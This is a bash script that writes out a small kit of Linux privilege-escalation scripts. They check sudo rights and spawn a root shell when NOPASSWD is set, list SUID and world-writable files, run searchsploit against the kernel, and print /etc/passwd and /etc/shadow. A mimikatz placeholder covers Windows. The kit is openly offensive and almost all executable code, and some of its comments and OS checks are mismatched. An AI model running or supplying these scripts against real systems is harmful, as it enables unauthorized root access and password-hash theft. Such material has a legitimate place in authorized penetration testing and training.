#!/bin/bash

# Create the directory for privilege escalation scripts
mkdir -p privileged_escalations

# Create script files for each method in Privilege Escalation class

# sudo_escalation.sh
cat << 'EOF' > privileged_escalations/sudo_escalation.sh
#!/bin/bash

# Check for sudo permissions that allow privilege escalation
echo "[*] Checking for Sudo Permissions..."
sudo -l

# Example: If sudo allows NOPASSWD or other commands, it could be used to escalate.
if sudo -l | grep -q "NOPASSWD"; then
    echo "[*] Sudo with NOPASSWD detected - You can run sudo commands without a password!"
    sudo bash  # Attempt to run sudo bash to escalate
else
    echo "[*] No NOPASSWD sudo permissions found."
fi
EOF

# suid_escalation.sh
cat << 'EOF' > privileged_escalations/suid_escalation.sh
#!/bin/bash

# Check for SUID/SGID binaries that may be exploited
echo "[*] Checking for SUID/SGID Binaries..."
find / -type f -perm -4000 2>/dev/null
EOF

# weak_permissions_escalation.sh
cat << 'EOF' > privileged_escalations/weak_permissions_escalation.sh
#!/bin/bash

# Check for world-writable files that can be exploited
echo "[*] Checking for files with weak permissions..."
find / -type f -perm -002 2>/dev/null
EOF

# kernel_exploit_check.sh
cat << 'EOF' > privileged_escalations/kernel_exploit_check.sh
#!/bin/bash

# Check for kernel vulnerabilities using searchsploit or known exploits
echo "[*] Checking for Kernel Vulnerabilities..."

# You should replace this line with actual exploit check commands, such as using searchsploit
searchsploit linux kernel
EOF

# dump_password_hashes.sh
cat << 'EOF' > privileged_escalations/dump_password_hashes.sh
#!/bin/bash

# Attempt to dump password hashes based on OS type

# For Windows systems (using mimikatz - this is a placeholder for mimikatz usage)
if [[ "$(uname)" == "Darwin" || "$(uname)" == "Linux" ]]; then
    # Linux
    echo "[*] Dumping password hashes from /etc/passwd..."
    cat /etc/passwd
    cat /etc/shadow
elif [[ "$(uname)" == "CYGWIN"* || "$(uname)" == "MINGW"* ]]; then
    # Windows (For example, using mimikatz - download it separately)
    echo "[*] Mimicatz could be used to dump Windows password hashes. Please check the mimikatz command."
else
    echo "[!] Unknown OS. Cannot proceed with hash dumping."
fi
EOF

# Make all the scripts executable
chmod +x privileged_escalations/*.sh

# Output the completion message
echo "[*] All privilege escalation scripts have been created and made executable."
